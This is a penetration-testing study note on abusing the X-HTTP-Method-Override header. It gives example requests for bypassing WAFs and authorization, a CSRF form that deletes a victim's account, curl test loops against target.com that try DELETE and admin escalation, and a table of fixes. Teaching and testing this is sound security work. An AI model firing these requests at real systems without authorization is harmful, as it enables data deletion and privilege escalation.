---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.22 X-HTTP-Method-Override — Method Tunneling, WAF Bypass"
---

# 03.22 — X-HTTP-Method-Override

## What is it?

`X-HTTP-Method-Override` is a non-standard header that lets clients "tunnel" an HTTP method through a different one (usually POST). Some frameworks (Ruby on Rails, Django REST Framework, ASP.NET) support this to allow PUT/DELETE via POST when intermediate proxies or firewalls block those methods.

Attackers abuse it to perform restricted HTTP methods and bypass WAF rules that only inspect the actual HTTP method.

---

## How It Works

```
INTENDED USE (legacy clients that only support GET/POST):
  POST /api/resource/123 HTTP/1.1
  X-HTTP-Method-Override: DELETE
  
  Framework processes this as DELETE /api/resource/123
  → Deletes resource!

RELATED HEADERS (try all):
  X-HTTP-Method-Override: DELETE
  X-Method-Override: DELETE
  X-HTTP-Method: DELETE
  _method=DELETE (POST body parameter)
  method=DELETE (POST body parameter)
```

---

## Attack 1: Access Restricted HTTP Methods

```
SCENARIO: PUT and DELETE are blocked at firewall.
  PUT /api/admin/user/1 → 405 Method Not Allowed (WAF blocks)

BYPASS:
  POST /api/admin/user/1 HTTP/1.1
  X-HTTP-Method-Override: PUT
  Content-Type: application/json
  
  {"role": "admin"}
  
  → If framework honors override → processes as PUT → modifies user!
```

---

## Attack 2: WAF Rule Bypass

```
WAF might block:
  DELETE /admin/user/5 → blocked (rate limited, requires auth)

But not inspect X-HTTP-Method-Override in POST:
  POST /admin/user/5 HTTP/1.1
  X-HTTP-Method-Override: DELETE
  
  → POST passes WAF → backend processes as DELETE!
```

---

## Attack 3: CSRF via Method Override

```
SCENARIO: DELETE requires non-simple method (preflight in CORS).
  → Browser CORS prevents cross-origin DELETE

BYPASS via form POST + override:
  <form method="POST" action="https://target.com/api/user/me">
    <input type="hidden" name="_method" value="DELETE">
  </form>
  
  → Sent as POST (simple request, no preflight)!
  → Backend treats as DELETE!
  → Deletes victim's account via CSRF!
```

---

## Attack 4: Authorization Bypass

```
SCENARIO: Authorization rules based on HTTP method:
  GET /api/users  → allowed for all
  DELETE /api/users/1 → admin only
  
  But authorization check only inspects REAL HTTP method:
  POST /api/users/1 HTTP/1.1
  X-HTTP-Method-Override: DELETE
  
  Auth check: "It's a POST → allowed"
  Backend logic: "X-HTTP-Method-Override says DELETE → delete it!"
  → Deleted without admin rights!
```

---

## Testing

```bash
# Test all override headers
for header in "X-HTTP-Method-Override" "X-Method-Override" "X-HTTP-Method"; do
  echo "Testing $header: DELETE"
  curl -X POST https://target.com/api/resource/1 \
    -H "$header: DELETE" -v 2>&1 | grep "< HTTP"
done

# Test via POST body parameter
curl -X POST https://target.com/api/resource/1 \
  -d "_method=DELETE"

# Test PUT via override
curl -X POST https://target.com/api/resource/1 \
  -H "X-HTTP-Method-Override: PUT" \
  -H "Content-Type: application/json" \
  -d '{"admin":true}'
```

---

## Frameworks That Support This

```
Ruby on Rails:     _method parameter in form (POST body)
Django REST:       X-HTTP-Method-Override header
ASP.NET WebAPI:    X-HTTP-Method-Override header
Laravel (PHP):     _method parameter
Express.js:        method-override middleware (if installed)
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Method override honored | Validate authorization against overridden method too |
| WAF bypass via override | Configure WAF to inspect X-HTTP-Method-Override header |
| CSRF via POST+override | Add CSRF tokens; implement SameSite cookies |
| Enable only if needed | Disable method override middleware if not needed |

---

## Related Notes
- [[23 - X-Method-Override]] — sibling override header
- [[24 - _method POST body]] — body parameter version
- [[02.06 - HTTP Methods]] — HTTP method security implications
- [[Module 03 - Access Control]] — authorization bypass patterns
